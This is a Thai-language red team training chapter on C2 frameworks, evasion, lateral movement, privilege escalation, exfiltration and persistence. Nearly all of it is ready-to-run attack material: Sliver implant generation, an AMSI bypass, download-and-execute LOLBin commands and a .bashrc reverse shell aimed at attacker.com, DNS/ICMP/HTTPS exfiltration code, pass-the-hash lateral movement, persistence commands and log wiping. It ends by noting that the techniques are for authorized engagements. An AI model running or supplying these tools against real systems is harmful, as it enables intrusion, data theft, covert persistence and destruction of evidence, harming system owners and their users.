# Part 56: Red Team Operations and C2 Frameworks (Steps 551-560)

## ภาพรวม
ส่วนนี้ครอบคลุมการดำเนินการ Red Team อย่างครบวงจร ตั้งแต่การตั้งค่า C2 Framework, Cobalt Strike Profiles, Evasion Techniques, Lateral Movement ไปจนถึงการทำ Post-Exploitation

---

## Step 551: C2 Framework Overview และ Covenant

### C2 Framework Comparison
```
=== C2 Framework Comparison ===

Cobalt Strike:
  + มี Malleable C2 Profiles
  + Beacon หลากหลาย protocol (HTTP/S, DNS, SMB)
  + มีครอบคลุม privilege escalation
  - ค่าใช้จ่ายสูง ($3500/year)

Metasploit/Meterpreter:
  + Free และ open source
  + มี exploit modules มาก
  - ถูก detect ได้ง่าย

Havoc:
  + Free และ Modern C2
  + Malleable profiles
  + Demon agent

Sliver:
  + Free, Go-based
  + Mutual TLS C2
  + Implant generation

Nimplant/BruteRatel:
  + Commercial, evasion-focused
```

### Sliver C2 Framework
```bash
# ติดตั้ง Sliver C2
curl https://sliver.sh/install|sudo bash
# หรือ download binary
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux && sudo ./sliver-server_linux

# Sliver Server commands
sliver > help
sliver > generate          # สร้าง implant
sliver > generate --http attacker.com:8080 --os windows --format exe -s /tmp/payload.exe

# HTTP listener
sliver > http -L 0.0.0.0 -l 8080

# HTTPS listener
sliver > https -L 0.0.0.0 -l 443

# DNS listener
sliver > dns -d c2.attacker.com

# MTls listener
sliver > mtls -L 0.0.0.0 -l 8888

# เมื่อ implant เชื่อมต่อ
sliver > sessions
sliver > use [session-id]
sliver (session) > whoami
sliver (session) > ps
sliver (session) > netstat
sliver (session) > shell
sliver (session) > upload /path/local /path/remote
sliver (session) > download /path/remote /path/local
```

### Sliver Implant Generation Script
```python
#!/usr/bin/env python3
# sliver_deployment.py

import subprocess
import json
from pathlib import Path

class SliverC2Manager:
    """Sliver C2 Framework Management"""
    
    def __init__(self, server_addr: str = '127.0.0.1', port: int = 31337):
        self.server_addr = server_addr
        self.port = port
    
    def generate_implant(self, 
                          c2_url: str,
                          os_type: str = 'windows',
                          format_type: str = 'exe',
                          output_path: str = '/tmp/implant.exe') -> bool:
        """Generate Sliver implant"""
        cmd = [
            'sliver-client', 'generate',
            '--http', c2_url,
            '--os', os_type,
            '--format', format_type,
            '-s', output_path,
            '-G',  # non-interactive
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.returncode == 0
    
    def generate_shellcode(self, c2_url: str,
                            output_path: str = '/tmp/shellcode.bin') -> bool:
        """Generate shellcode implant"""
        cmd = [
            'sliver-client', 'generate',
            '--http', c2_url,
            '--os', 'windows',
            '--format', 'shellcode',
            '-s', output_path,
            '-G',
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.returncode == 0
    
    def generate_service(self, c2_url: str,
                          output_path: str = '/tmp/service.exe') -> bool:
        """Generate Windows Service implant"""
        cmd = [
            'sliver-client', 'generate',
            '--http', c2_url,
            '--os', 'windows',
            '--format', 'service',
            '-s', output_path,
            '-G',
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.returncode == 0


C2_SETUP_GUIDE = """
=== C2 Infrastructure Setup ===

1. REDIRECTORS:
   - ใช้ VPS เป็น redirector แทน ส่ง traffic ไป Team Server
   - Apache mod_rewrite:
     RewriteRule ^/api/(.*)$ http://teamserver/$1 [P,L]
   
2. DOMAIN FRONTING:
   - ใช้ CDN (Cloudflare, AWS CloudFront) ซ่อน C2 traffic
   - Host header ชี้ไป Team Server

3. HTTPS CERTIFICATE:
   - Let's Encrypt หรือซื้อ domain cert
   - ตั้งค่าคนละ TLS profile

4. DNS C2:
   - เซ็น NS record ชี้ไป Team Server
   - DNS TXT/A/AAAA records เป็น C2 channel

5. OPSEC:
   - ไม่ใช้ default ports (8080, 4444)
   - Sleep/jitter configuration
   - Process injection แทน spawn process ใหม่
"""
```

---

## Step 552: Cobalt Strike Malleable C2 Profiles

### Malleable C2 Profile Framework
```python
#!/usr/bin/env python3
# malleable_c2.py

class MalleableC2ProfileGenerator:
    """Generate Malleable C2 Profiles สำหรับ Cobalt Strike"""
    
    def generate_amazon_profile(self) -> str:
        """Profile ที่เลียนแบบ Amazon traffic"""
        profile = """
set sleeptime "5000";
set jitter "10";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Referer" "https://www.amazon.com/";
        header "Connection" "keep-alive";
        
        metadata {
            base64url;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "; csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
            header "Cookie";
        }
    }
    server {
        header "Server" "Server";
        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
        header "x-amz-id-2" "a21yZ2xrNDNtdGRsa";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Encoding" "gzip";
        header "Transfer-Encoding" "chunked";
        header "Connection" "keep-alive";
        
        output {
            print;
        }
    }
}

http-post {
    set uri "/N4215/adj/amzn.us.sr.aps";
    client {
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "www.amazon.com";
        
        id {
            base64url;
            parameter "sz";
        }
        output {
            base64url;
            parameter "oe";
        }
    }
    server {
        header "Server" "Server";
        header "Connection" "keep-alive";
        output {
            print;
        }
    }
}
"""
        return profile
    
    def generate_office365_profile(self) -> str:
        """Profile ที่เลียนแบบ Office 365 traffic"""
        return """
set sleeptime "10000";
set jitter "25";
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-get {
    set uri "/oab/auth/oabauthwopi.srf";
    client {
        header "Accept" "*/*";
        header "ms-cv" "";
        header "Accept-Language" "en-US";
        metadata {
            base64url;
            header "X-IDATAG";
        }
    }
    server {
        output {
            print;
        }
    }
}
"""


# Profile validation tools
PROFILE_TOOLS = """
# ตรวจสอบ Malleable C2 profile
cd /opt/cobaltstrike
java -jar c2lint /path/to/profile.c2

# Arsenal Kit สำหรับ evasion
# https://github.com/Cobalt-Strike/arsenal-kit

# Community profiles:
# https://github.com/xx0hcd/Malleable-C2-Profiles
# https://github.com/threatexpress/malleable-c2
"""
```

---

## Step 553: Process Injection และ Defense Evasion

### Process Injection Techniques
```python
#!/usr/bin/env python3
# process_injection.py

# หมายเหตุ: ใช้เพื่อเรียนรู้เท่านั้น
IMPLEMENTATION_REFERENCE = """
=== Process Injection Techniques (Windows) ===

1. Classic DLL Injection:
   CreateRemoteThread + LoadLibrary
   Steps:
   a. OpenProcess(target_pid)
   b. VirtualAllocEx(process, size)
   c. WriteProcessMemory(process, dll_path)
   d. CreateRemoteThread(process, LoadLibraryA, dll_path_addr)

2. Process Hollowing:
   a. CreateProcess("svchost.exe", SUSPENDED)
   b. NtUnmapViewOfSection(process, base_addr)
   c. VirtualAllocEx(process, new_size)
   d. WriteProcessMemory(process, payload)
   e. SetThreadContext(thread, new_eip=payload)
   f. ResumeThread(thread)

3. Thread Hijacking:
   a. OpenProcess + OpenThread(target)
   b. SuspendThread(thread)
   c. GetThreadContext -> read RIP
   d. VirtualAllocEx + Write shellcode
   e. SetThreadContext (RIP = shellcode)
   f. ResumeThread

4. APC Injection (Asynchronous Procedure Call):
   a. OpenProcess + OpenThread (alertable target)
   b. VirtualAllocEx + WriteProcessMemory
   c. QueueUserAPC(shellcode, thread)
   -> executes when thread becomes alertable

5. Early Bird Injection:
   a. CreateProcess(target, SUSPENDED)
   b. VirtualAllocEx + WriteProcessMemory
   c. QueueUserAPC(shellcode, main_thread)
   d. ResumeThread -> APC runs before main()

6. Atom Bombing:
   a. GlobalAddAtom(shellcode) -> atom table
   b. Target process: QueueUserAPC + NtSetContextThread
   c. Force target to execute from atom table

7. Process Doppelganging (NTFS Transactions):
   a. CreateTransaction()
   b. CreateFileTransacted("legit.exe")
   c. WriteFile(malware_content)
   d. CreateSection from transacted file
   e. RollbackTransaction (changes disappear!)
   f. CreateProcess from section
"""

DEFENSE_EVASION = """
=== Defense Evasion Techniques ===

1. Unhooking NTDLL:
   - EDR hooks NTDLL functions to monitor
   - Read ntdll.dll from disk -> overwrite hooked copy in memory
   - Restore clean syscall stubs

2. Direct Syscalls:
   - Skip NTDLL hooks โดย call syscall instruction ตรงๆ
   - Find syscall numbers from ntdll offsets
   - Hell's Gate / Halo's Gate technique

3. AMSI Bypass:
   - Patch amsi.dll AmsiScanBuffer function
   - Return AMSI_RESULT_CLEAN
   # PowerShell:
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

4. ETW Bypass:
   - Patch ntdll.dll EtwEventWrite
   - Prevent telemetry logging

5. Timestomping:
   - Modify file timestamps to match legit files
   - touch -t 202001010000 malware.exe

6. Living Off the Land (LOLBins):
   - certutil.exe, regsvr32.exe, mshta.exe, wmic.exe
   - Evade application whitelisting

7. Signed Binary Proxy Execution:
   - Use signed Windows binaries to run code
   - regsvr32 /s /u /i:http://attacker.com/file.sct scrobj.dll
"""

SHELLCODE_LOADERS = """
=== Shellcode Loaders (for authorized testing) ===

Python Loader:
import ctypes
shellcode = b"\\x90" * 100  # NOP sled
buf = ctypes.create_string_buffer(shellcode)
funcptr = ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p))
# ต้องทำ VirtualAlloc + EXECUTE permission ก่อน

PowerShell Loader:
$code = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(len)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $code, $len)
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($code, $delegateType)
$delegate.Invoke()

C# Loader:
using System.Runtime.InteropServices;
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr lpAddr, UIntPtr dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpAttr, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParam, uint dwCreation, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
"""
```

---

## Step 554: Living Off the Land และ LOLBins

### LOLBins Framework
```python
#!/usr/bin/env python3
# lolbins.py

LOLBINS_CATALOG = {
    'certutil': {
        'description': 'Certificate utility - download files',
        'commands': [
            'certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe',
            'certutil.exe -decode base64file.txt decoded.exe',
            'certutil.exe -encode input.exe output.b64',
        ]
    },
    'mshta': {
        'description': 'Microsoft HTML Application Host',
        'commands': [
            'mshta.exe http://attacker.com/payload.hta',
            'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Exec(""cmd"")")(window.close)',
        ]
    },
    'regsvr32': {
        'description': 'Register/unregister COM DLLs',
        'commands': [
            'regsvr32 /s /u /i:http://attacker.com/file.sct scrobj.dll',
            'regsvr32 /s /n /u /i:http://attacker.com/sct.xml scrobj.dll',
        ]
    },
    'rundll32': {
        'description': 'Run DLL functions',
        'commands': [
            'rundll32.exe javascript:"..\\mshtml,RunHTMLApplication";...',
            'rundll32.exe url.dll,OpenURL http://attacker.com',
            'rundll32.exe shell32.dll,Control_RunDLL payload.dll',
        ]
    },
    'wmic': {
        'description': 'Windows Management Instrumentation',
        'commands': [
            'wmic process call create "cmd.exe /c payload.exe"',
            'wmic /node:target process call create "cmd.exe /c ...',
        ]
    },
    'powershell': {
        'description': 'PowerShell execution methods',
        'commands': [
            'powershell -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/ps.ps1\')"',
            'powershell -enc BASE64_ENCODED_COMMAND',
            'powershell -c "[System.Net.WebClient]::new().DownloadFile(\'http://x.com/p.exe\', \'p.exe\'); Start-Process p.exe"',
        ]
    },
    'msiexec': {
        'description': 'Windows Installer',
        'commands': [
            'msiexec /quiet /i http://attacker.com/payload.msi',
            'msiexec /y malicious.dll',  # register DLL
        ]
    },
    'bitsadmin': {
        'description': 'Background Intelligent Transfer Service',
        'commands': [
            'bitsadmin /transfer job /download /priority FOREGROUND http://attacker.com/payload.exe %TEMP%\\payload.exe',
        ]
    },
    'wscript': {
        'description': 'Windows Script Host',
        'commands': [
            'wscript //B //Nologo payload.js',
            'wscript //B //Nologo http://attacker.com/payload.js',  # some versions
        ]
    },
    'cmstp': {
        'description': 'Microsoft Connection Manager Profile',
        'commands': [
            'cmstp.exe /ni /s payload.inf',  # UAC bypass + code exec
        ]
    },
}

# LOLBAS reference
LOLBAS_LOOKUP = """
# LOLBins, LOLScripts, LOLLibs database
# https://lolbas-project.github.io/

# GTFOBins (Linux)
# https://gtfobins.github.io/

# ใช้ LOLBins สำหรับ:
# - Download/execute payloads
# - Bypass application whitelisting
# - UAC bypass
# - Persistence
# - Privilege escalation
"""

if __name__ == '__main__':
    print("[*] LOLBins Catalog:")
    for lolbin, info in LOLBINS_CATALOG.items():
        print(f"\n{lolbin}: {info['description']}")
        for cmd in info['commands'][:1]:
            print(f"  Example: {cmd[:80]}...")
```

---

## Step 555: Lateral Movement Techniques

### Lateral Movement Framework
```python
#!/usr/bin/env python3
# lateral_movement.py

from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, srvs, scmr, wkst
import subprocess

class LateralMovementAttacker:
    """Lateral Movement Attack Framework"""
    
    def __init__(self, domain: str, username: str, 
                 password: str = None, nt_hash: str = None):
        self.domain = domain
        self.username = username
        self.password = password
        self.nt_hash = nt_hash
    
    def psexec(self, target: str, command: str) -> str:
        """PsExec-style remote execution ผ่าน SMB"""
        if self.nt_hash:
            cmd = [
                'python3', 'psexec.py',
                f'{self.domain}/{self.username}@{target}',
                '-hashes', f':{self.nt_hash}',
                command
            ]
        else:
            cmd = [
                'python3', 'psexec.py',
                f'{self.domain}/{self.username}:{self.password}@{target}',
                command
            ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def wmiexec(self, target: str, command: str) -> str:
        """WMI remote execution"""
        cmd_base = ['python3', 'wmiexec.py']
        
        if self.nt_hash:
            cmd_base.extend([
                f'{self.domain}/{self.username}@{target}',
                '-hashes', f':{self.nt_hash}'
            ])
        else:
            cmd_base.append(f'{self.domain}/{self.username}:{self.password}@{target}')
        
        cmd_base.append(command)
        result = subprocess.run(cmd_base, capture_output=True, text=True)
        return result.stdout
    
    def atexec(self, target: str, command: str) -> str:
        """AT/Task Scheduler remote execution"""
        cmd = ['python3', 'atexec.py']
        
        if self.nt_hash:
            cmd.extend([
                f'{self.domain}/{self.username}@{target}',
                command,
                '-hashes', f':{self.nt_hash}'
            ])
        else:
            cmd.extend([
                f'{self.domain}/{self.username}:{self.password}@{target}',
                command
            ])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def evil_winrm(self, target: str) -> subprocess.Popen:
        """WinRM remote shell"""
        if self.nt_hash:
            cmd = ['evil-winrm', '-i', target, '-u', self.username, '-H', self.nt_hash]
        else:
            cmd = ['evil-winrm', '-i', target, '-u', self.username, '-p', self.password]
        
        return subprocess.Popen(cmd)
    
    def smb_spray(self, targets: list, command: str) -> dict:
        """Spray ไปหลาย targets ด้วย SMB"""
        results = {}
        
        for target in targets:
            try:
                # ทดสอบการเชื่อมต่อ
                conn = SMBConnection(target, target)
                if self.nt_hash:
                    conn.login(
                        self.username, '', self.domain,
                        lmhash='aad3b435b51404eeaad3b435b51404ee',
                        nthash=self.nt_hash
                    )
                else:
                    conn.login(self.username, self.password, self.domain)
                
                results[target] = {'status': 'SUCCESS', 'shares': []}
                
                # List shares
                shares = conn.listShares()
                for share in shares:
                    results[target]['shares'].append(share['shi1_netname'][:-1])
                
                # Execute command
                if command:
                    output = self.psexec(target, command)
                    results[target]['command_output'] = output
                
                conn.close()
                print(f"[+] {target}: SUCCESS")
                
            except Exception as e:
                results[target] = {'status': 'FAILED', 'error': str(e)}
        
        return results


LATERAL_COMMANDS = """
# CrackMapExec - Lateral Movement
# SMB lateral movement
crackmapexec smb TARGET -u user -p pass -x 'whoami'
crackmapexec smb TARGET -u user -H HASH -x 'whoami'

# WMI lateral movement
crackmapexec wmi TARGET -u user -p pass -x 'whoami'

# WinRM
crackmapexec winrm TARGET -u user -p pass -x 'whoami'

# Scan subnet
crackmapexec smb 192.168.1.0/24 -u user -p pass

# impacket suite
python3 psexec.py  DOMAIN/user:pass@TARGET 'cmd.exe /c whoami'
python3 wmiexec.py DOMAIN/user:pass@TARGET 'whoami'
python3 smbexec.py DOMAIN/user:pass@TARGET
python3 atexec.py  DOMAIN/user:pass@TARGET 'whoami'

# Pass-the-Hash lateral movement
crackmapexec smb SUBNET/24 -u administrator -H HASH --exec-method wmiexec -x 'whoami'
"""
```

---

## Step 556: Post-Exploitation และ Privilege Escalation

### Post-Exploitation Framework
```python
#!/usr/bin/env python3
# post_exploitation.py

from dataclasses import dataclass
from typing import List

@dataclass
class ExploitInfo:
    name: str
    cve: str
    target: str
    description: str
    command: str

class PrivEscFramework:
    """Privilege Escalation และ Post-Exploitation Framework"""
    
    LINUX_PRIVESC_CHECKS = [
        # SUID binaries
        'find / -perm -4000 -type f 2>/dev/null',
        # Writable /etc/passwd
        'ls -la /etc/passwd',
        # Sudo โดยไม่ต้องการ password
        'sudo -l',
        # Crontab
        'cat /etc/crontab',
        'ls -la /etc/cron*',
        # Writable paths ใน PATH
        'echo $PATH',
        # Kernel version
        'uname -a',
        # NFS shares
        'cat /etc/exports',
        # Process ที่รัน root
        'ps aux | grep root',
        # Capabilities
        'getcap -r / 2>/dev/null',
        # Writable ไฟล์ script ใน PATH
        'find /usr/local/bin -writable 2>/dev/null',
    ]
    
    WINDOWS_PRIVESC_CHECKS = [
        # System info
        'systeminfo',
        # Privilege
        'whoami /priv',
        # Services ที่แก้ไข binary ได้
        'sc qc ServiceName',
        # Unquoted service path
        'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"',
        # AlwaysInstallElevated
        'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer',
        # Stored credentials
        'cmdkey /list',
        'reg query HKLM /f password /t REG_SZ /s',
        # Scheduled tasks
        'schtasks /query /fo LIST /v',
        # Writeable services
        'accesschk.exe -wuvc * 2>/dev/null',
    ]
    
    LINUX_PRIVESC_EXPLOITS = [
        ExploitInfo(
            name='DirtyCow',
            cve='CVE-2016-5195',
            target='Linux Kernel 2.6.22 - 3.9',
            description='Race condition in copy-on-write',
            command='gcc dirty.c -o dirty -pthread && ./dirty'
        ),
        ExploitInfo(
            name='PwnKit',
            cve='CVE-2021-4034',
            target='pkexec (polkit)',
            description='Local privilege escalation via polkit pkexec',
            command='git clone https://github.com/ly4k/PwnKit && ./PwnKit'
        ),
        ExploitInfo(
            name='Sudo Baron Samedit',
            cve='CVE-2021-3156',
            target='sudo < 1.9.5p2',
            description='Heap buffer overflow in sudo',
            command='sudoedit -s /tmp/ $(python3 -c "print(\'A\'*100)")'
        ),
    ]
    
    WINDOWS_PRIVESC_EXPLOITS = [
        ExploitInfo(
            name='PrintNightmare',
            cve='CVE-2021-34527',
            target='Windows Print Spooler',
            description='Print Spooler RCE / LPE',
            command='python3 CVE-2021-34527.py DOMAIN/user:pass@TARGET dll_path'
        ),
        ExploitInfo(
            name='HiveNightmare',
            cve='CVE-2021-36934',
            target='Windows 10 21H1+',
            description='Shadow Volume Copy อ่านได้',
            command='icacls C:\\Windows\\System32\\config\\SAM'
        ),
        ExploitInfo(
            name='SpoolFool',
            cve='CVE-2022-21999',
            target='Windows Print Spooler',
            description='Local Privilege Escalation',
            command='SpoolFool.exe -dll payload.dll'
        ),
    ]
    
    def run_linux_enumeration(self) -> dict:
        """Run Linux enumeration checks"""
        import subprocess
        
        results = {}
        for cmd in self.LINUX_PRIVESC_CHECKS:
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=5
                )
                if result.stdout.strip():
                    results[cmd] = result.stdout.strip()
            except Exception:
                pass
        
        return results


POST_EXPLOIT_COMMANDS = """
# Linux Enumeration
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Windows Enumeration
Invoke-WebRequest https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe
.\\winpeas.exe

# PowerUp.ps1 (Windows privilege escalation)
Import-Module PowerUp.ps1
Invoke-AllChecks

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh && ./lse.sh -l 2

# pspy (monitor processes without root)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64 && ./pspy64
"""
```

---

## Step 557: การหลบเลียงและ Data Exfiltration

### Data Exfiltration Techniques
```python
#!/usr/bin/env python3
# data_exfiltration.py

import subprocess
import base64
import socket

class DataExfiltrator:
    """Data Exfiltration Techniques"""
    
    def exfil_via_dns(self, data: bytes, c2_domain: str) -> None:
        """Exfiltrate data ผ่าน DNS queries"""
        # Base32 encode (DNS-safe characters)
        import base64
        encoded = base64.b32encode(data).decode()
        
        # แบ่งเป็น chunks (max DNS label = 63 chars)
        chunk_size = 60
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            # DNS query: chunk.index.c2domain
            hostname = f"{chunk}.{i}.{c2_domain}"
            try:
                socket.gethostbyname(hostname)
            except Exception:
                pass  # DNS NXDOMAIN = chunk received
    
    def exfil_via_icmp(self, data: bytes, target_ip: str) -> None:
        """Exfiltrate data ผ่าน ICMP"""
        try:
            from scapy.all import IP, ICMP, send
            
            chunk_size = 200
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i+chunk_size]
                pkt = IP(dst=target_ip)/ICMP()/chunk
                send(pkt, verbose=False)
        except ImportError:
            print("Install scapy: pip3 install scapy")
    
    def exfil_via_https(self, data: bytes, c2_url: str,
                         disguise: str = 'user_agent') -> bool:
        """Exfiltrate ผ่าน HTTPS POST"""
        import requests
        
        encoded = base64.b64encode(data).decode()
        
        if disguise == 'user_agent':
            # ซ่อนใน User-Agent header
            resp = requests.get(
                c2_url,
                headers={'User-Agent': f'Mozilla/5.0 (encoded: {encoded[:100]})'}
            )
        elif disguise == 'cookie':
            # ซ่อนใน Cookie
            resp = requests.get(
                c2_url,
                cookies={'session': encoded}
            )
        else:
            # POST body
            resp = requests.post(c2_url, json={'data': encoded})
        
        return resp.status_code == 200
    
    def exfil_via_smb(self, data_path: str, target: str,
                       share: str, dest_path: str) -> None:
        """Exfiltrate ผ่าน SMB share"""
        cmd = f"smbclient \\\\{target}\\{share} -U guest -N -c 'put {data_path} {dest_path}'"
        subprocess.run(cmd, shell=True)


EXFIL_STEGANOGRAPHY = """
# ซ่อนข้อมูลในรูปภาพ (Steganography)

# steghide
steghide embed -cf cover.jpg -sf secret.txt -p password
steghide extract -sf cover.jpg -p password

# zsteg (PNG/BMP)
zsteg cover.png
zsteg -a cover.png  # try all methods

# Outguess
outguess -d secret.txt -k password cover.jpg steg.jpg
outguess -r -k password steg.jpg output.txt

# OpenStego (GUI)
java -jar openstego.jar
"""
```

---

## Step 558-560: การควบคุม Persistence และ Cleanup

### Persistence Mechanisms
```python
#!/usr/bin/env python3
# persistence.py

PERSISTENCE_TECHNIQUES = {
    'windows_registry': """
# Registry Run Keys (HKLM หรือ HKCU)
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Update" /t REG_SZ /d "C:\\payload.exe"
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "svchost" /d "C:\\Windows\\System32\\payload.dll,StartMain"

# Winlogon
reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v "Userinit" /d "C:\\Windows\\system32\\userinit.exe,C:\\payload.exe"
""",
    'windows_service': """
# Create service
sc create MyService binPath= "C:\\payload.exe" start= auto
sc start MyService

# PowerShell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\\payload.exe" -StartupType Automatic
""",
    'scheduled_task': """
# schtasks
schtasks /Create /TN "\\Microsoft\\Windows\\Defrag\\Update" /TR "C:\\payload.exe" /SC DAILY /ST 09:00
schtasks /Create /TN Task /TR "C:\\payload.exe" /SC ONLOGON

# PowerShell
$action = New-ScheduledTaskAction -Execute 'C:\\payload.exe'
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName 'Updater' -Action $action -Trigger $trigger -RunLevel Highest
""",
    'wmi_subscription': """
# WMI Permanent Event Subscription
$filterArgs = @{name='BadFilter'; EventNameSpace='root\\CimV2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs

$consumerArgs = @{name='BadConsumer'; ExecutablePath='C:\\payload.exe'}
$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs

$bindingArgs = @{Filter=[Ref]$filter; Consumer=[Ref]$consumer}
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $bindingArgs
""",
    'linux_crontab': """
# Crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/payload.sh") | crontab -

# /etc/cron.d/
echo "*/5 * * * * root /tmp/payload.sh" > /etc/cron.d/update

# systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update
[Service]
Type=simple
ExecStart=/tmp/payload.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service && systemctl start update.service
""",
    'linux_bashrc': """
# ~/.bashrc backdoor
echo 'nc -e /bin/bash attacker.com 4444 &' >> ~/.bashrc

# ~/.ssh/authorized_keys
echo 'ssh-rsa ATTACKER_KEY' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
"""
}

CLEANUP_PROCEDURES = """
=== Red Team Cleanup Procedures ===

1. Remove tools and payloads:
   rm -f /tmp/payload* /tmp/*.exe /tmp/*.sh
   del /f C:\\Windows\\Temp\\* C:\\Users\\*\\AppData\\Roaming\\*.exe

2. Clear logs:
   # Windows
   wevtutil cl System
   wevtutil cl Security
   wevtutil cl Application
   wevtutil cl Windows-PowerShell\\Operational
   
   # Linux
   > /var/log/auth.log
   > /var/log/syslog
   history -c
   
3. Remove persistence:
   # Registry
   reg delete HKCU\\...\\Run /v "Update" /f
   
   # Scheduled Tasks
   schtasks /delete /tn Task /f
   
   # Services
   sc delete MyService
   
   # Crontab
   crontab -r

4. Restore modified files

5. เขียนรายงานให้ client
"""

if __name__ == '__main__':
    print("[*] Persistence Techniques Available:")
    for technique in PERSISTENCE_TECHNIQUES:
        print(f"  - {technique}")
    print("\n[!] Always cleanup after authorized testing")
```

---

## สรุป Part 56

ในส่วนนี้เราได้เรียนรู้:
- **Step 551**: C2 Frameworks (Sliver, Havoc, overview)
- **Step 552**: Cobalt Strike Malleable C2 Profiles
- **Step 553**: Process Injection และ Defense Evasion
- **Step 554**: Living Off the Land Binaries (LOLBins)
- **Step 555**: Lateral Movement (PsExec, WMI, WinRM)
- **Step 556**: Post-Exploitation และ Privilege Escalation
- **Step 557**: Data Exfiltration (DNS, ICMP, HTTPS, Steganography)
- **Step 558-560**: Persistence Mechanisms และ Cleanup

ทุกเทคนิคต้องใช้ใน **authorized red team engagement** เท่านั้น
